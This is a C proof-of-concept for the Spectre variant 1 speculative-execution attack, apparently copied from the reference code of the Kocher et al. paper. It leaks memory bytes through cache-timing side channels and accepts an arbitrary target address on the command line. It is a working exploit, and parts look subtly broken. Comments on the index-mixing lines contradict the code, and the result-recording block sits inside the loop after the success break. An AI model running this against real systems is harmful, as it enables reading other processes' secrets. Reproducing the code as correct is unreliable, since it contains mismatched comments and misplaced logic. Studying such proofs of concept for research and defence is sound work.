/* spectre-test.c
 * https://paulkocher.com/doc/Spectre-Attacks_Exploiting-Speculative-Execution.pdf
 * Compile with gcc -march=native option */
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#ifdef _MSC_VER
#include <intrin.h>         /* For rdtscp and clflush */
#pragma optimize("gt", on)
#else
#include <x86intrin.h>      /* For rdtscp and clflush */
#endif

/* Victim code */
unsigned int array1_size = 16;
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t array2[256 * 512];  /* 131072 */
uint8_t unused1[64];
uint8_t unused2[64];

char *secret = "On the bonnie, bonnie banks of Loch Lomond.";

uint8_t temp = 0; /* Prevent compiler from optimizing out victim_function() */

void victim_function(size_t x) {
    if (x < array1_size) {
        temp &= array2[array1[x] * 512];
    }
}

/* Analysis code */
#define CACHE_HIT_THRESHOLD (80) /* Assume cache hit if time <= threshold  */

/* Report best guess in value[0] and runner-up in value[1] */
void readMemoryByte(size_t malicious_x, uint8_t value[2], int score[2]) {
    static int results[256];
    int attempts, i, j, k, mix_i;
    size_t training_x, x;
    unsigned int junk = 0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;

    for (i = 0; i < 256; i++) {
        results[i] = 0;
    }

    for (attempts = 999; attempts > 0; attempts--) {
        /* Flush array2[256 * (0..256)] from cache */
        for (i = 0; i < 256; i++) {
            _mm_clflush(&array2[i * 512]);
        }

        /* 30 loops: 5 training runs per attack run */
        training_x = attempts % array1_size;
        for (j = 29; j >= 0; j--) {
            _mm_clflush(&array1_size);
            for (volatile int z = 0; z < 100; z++) { }  /* Can also mfence */
            
            x = ((j % 6) - 1) & ~0xFFFF;                /* if j % 0x110 == 0 then x = FFF.FF000 else x = 0 */
            x = (x | (x >> 16));                        /* If j & 0x110 == 0 then x = -1 else x = 0 */
            x = training_x ^ (x & (malicious_x ^ training_x));

            /* Call the victim */
            victim_function(x);
        }

        /* Read timestamps. Order is slightly mixed up to prevent stride prediction */
        for (i = 0; i < 256; i++) {
            mix_i = ((i * 167) + 13) & 255;
            addr = &array2[mix_i * 512];
            time1 = __rdtscp(&junk);
            junk = *addr;
            time2 = __rdtscp(&junk) - time1;
            if (time2 <= CACHE_HIT_THRESHOLD && mix_i != array1[attempts % array1_size]) {
                results[mix_i]++;
            }
        }

        /* Locate highest and second-highest results */
        j = k = -1;
        for (i = 0; i < 256; i++) {
            if (j < 0 || results[i] >= results[j]) {
                k = j;
                j = i;
            } else if (k < 0 || results[i] >= results[k]) {
                k = i;
            }
        }
        if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0)) {
            break;          /* Success if best greater than 2*runner-up + 5 or 2/0 */
        }
        results[0] ^= junk; /* Use junk to prevent optimization */
        value[0] = (uint8_t)j;
        score[0] = results[j];
        value[1] = (uint8_t)k;
        score[1] = results[k];
    }
}

int main(int argc, const char **argv)
{
    size_t malicious_x = (size_t)(secret - (char *)array1);
    int i, score[2], len = 43;
    uint8_t value[2];

    for (i = 0; i < sizeof(array2); i++) {
        array2[i] = 1; /* Write to array2 to prevent COW zero pages in RAM */
    }
    if (argc == 3) {
        sscanf(argv[1], "%p", (void **)(&malicious_x));
        malicious_x -= (size_t)array1;
        sscanf(argv[2], "%d", &len);
    }

    printf("Reading %d bytes:\n", len);
    while (--len >= 0) {
        printf("Reading at malicious_x = %p... ", (void *)malicious_x);
        readMemoryByte(malicious_x++, value, score);
        printf("%s: ", (score[0] >= 2 * score[1] ? "Success" : "Unclear"));
        printf("0x%02X='%c' score=%-4d ", value[0], (value[0] > 31 && value[0] < 127 ? value[0] : '?'), score[0]);
        if (score[1] > 0) {
            printf("( second best: 0x%02X score=%-4d)", value[1], score[1]);
        }
        printf("\n");
    }
    return 0;
}
